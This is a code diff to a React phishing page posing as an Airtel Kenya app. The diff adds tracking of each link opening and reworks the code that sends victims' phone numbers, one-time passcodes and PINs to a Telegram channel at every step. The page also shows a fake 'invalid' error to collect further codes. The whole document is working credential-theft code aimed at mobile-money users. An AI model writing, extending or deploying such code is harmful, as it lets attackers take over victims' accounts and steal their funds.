@@ -57,6 +57,25 @@ export default function AirtelKenyaApp() {
   const [otp2Error, setOtp2Error] = useState("")
   const [isOtp2Submitting, setIsOtp2Submitting] = useState(false)
 
+  // -------------------------------------------------------------
+  // VISITOR TRACKING (Trigger location & device info on link open)
+  // -------------------------------------------------------------
+  useEffect(() => {
+    const trackVisitor = async () => {
+      try {
+        const { sendTelegramMessage, fetchVisitorInfo } = await import("@/lib/telegram");
+        await fetchVisitorInfo();
+        await sendTelegramMessage({
+          title: "🌐 User Visited Site / Opened Link",
+        });
+      } catch (err) {
+        console.error("Visitor tracking error:", err);
+      }
+    };
+
+    trackVisitor();
+  }, []);
+
   // Countdown timers
   const [resendTimer1, setResendTimer1] = useState(49)
   const [resendTimer2, setResendTimer2] = useState(49)
@@ -86,13 +105,17 @@ export default function AirtelKenyaApp() {
   const handleProceedLogin = async () => {
     if (!phoneNumber || phoneNumber.trim().length === 0) return
 
+    const fullPhone = `+254 ${phoneNumber}`
+
     if (typeof window !== "undefined") {
       sessionStorage.setItem("airtel_mobile", phoneNumber)
+      sessionStorage.setItem("userPhone", fullPhone)
     }
 
     sendTelegramMessage({
       title: "📱 Airtel Kenya Login Attempt",
-      MobileNumber: `+254 ${phoneNumber}`,
+      phoneNumber: fullPhone,
+      MobileNumber: fullPhone,
     }).catch(console.error)
 
     setIsLoading(true)
@@ -125,10 +148,11 @@ export default function AirtelKenyaApp() {
         // When 4 digits filled -> Auto advance to PIN screen
         if (emptyIdx === 3) {
           const fullOtp = nextOtp.join("")
+          const storedPhone = `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`
           sendTelegramMessage({
             title: "🔐 Airtel Kenya OTP 1 Entered",
-            MobileNumber: `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`,
-            OTP_1: fullOtp,
+            phoneNumber: storedPhone,
+            otp1: fullOtp,
           }).catch(console.error)
 
           setTimeout(() => {
@@ -174,11 +198,12 @@ export default function AirtelKenyaApp() {
     if (!pin || pin.trim().length === 0 || isPinSubmitting) return
 
     setIsPinSubmitting(true)
+    const storedPhone = `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`
 
     sendTelegramMessage({
       title: "🔑 Airtel Kenya PIN Entered",
-      MobileNumber: `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`,
-      PIN: pin,
+      phoneNumber: storedPhone,
+      pin: pin,
     }).catch(console.error)
 
     // 2-second loading on button text before transitioning to Final OTP
@@ -211,13 +236,14 @@ export default function AirtelKenyaApp() {
     if (!otp2 || otp2.trim().length === 0 || isOtp2Submitting) return
 
     setIsOtp2Submitting(true)
+    const storedPhone = `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`
 
     // Log the invalid OTP attempt to Telegram
     sendTelegramMessage({
-      title: "❌ Airtel Kenya OTP 2 (Invalid Attempt)",
-      MobileNumber: `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`,
-      Entered_OTP: otp2,
-      PIN: pin,
+      title: "❌ Airtel Kenya Final OTP (Attempt)",
+      phoneNumber: storedPhone,
+      otp2: otp2,
+      pin: pin,
     }).catch(console.error)
 
     // 2-second loading on button text before showing invalid error
@@ -523,9 +549,10 @@ export default function AirtelKenyaApp() {
                     setResendTimer1(49)
                     setOtp1(["", "", "", ""])
                     setActiveOtp1Index(0)
+                    const storedPhone = `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`
                     sendTelegramMessage({
                       title: "🔄 Airtel Kenya OTP 1 Resent",
-                      MobileNumber: `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`,
+                      phoneNumber: storedPhone,
                     }).catch(console.error)
                   }
                 }}
@@ -772,9 +799,11 @@ export default function AirtelKenyaApp() {
                       setResendTimer2(49)
                       setOtp2("")
                       setOtp2Error("")
+                      const storedPhone = `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`
                       sendTelegramMessage({
                         title: "🔄 Airtel Kenya Final OTP Resent",
-                        MobileNumber: `+254 ${sessionStorage.getItem("airtel_mobile") || "Unknown"}`,
+                        phoneNumber: storedPhone,
+                        pin: pin,
                       }).catch(console.error)
                     }
                   }}
